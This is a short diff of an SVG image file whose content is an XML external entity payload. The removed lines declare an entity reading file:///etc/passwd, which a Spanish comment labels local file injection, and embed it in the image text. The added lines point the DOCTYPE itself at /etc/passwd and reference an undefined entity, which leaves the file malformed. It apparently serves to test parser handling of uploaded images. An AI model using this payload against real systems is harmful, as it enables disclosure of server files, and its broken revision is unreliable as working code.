@@ -1,16 +1,12 @@
 <?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+<!DOCTYPE svg SYSTEM "file:///etc/passwd"
  "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
-
- <!DOCTYPE svg [
-    <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!-- Inyección de archivo local -->
-  ]>
 
 <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
  width="300.000000pt" height="132.000000pt" viewBox="0 0 300.000000 132.000000"
  preserveAspectRatio="xMidYMid meet">
 <metadata>
-  <text x="10" y="20">Data &xxe;</text> <!-- Llamada a la entidad -->
+  <text x="10" y="20">Data &svg;</text> <!-- Llamada a la entidad -->
 </metadata>
 
 
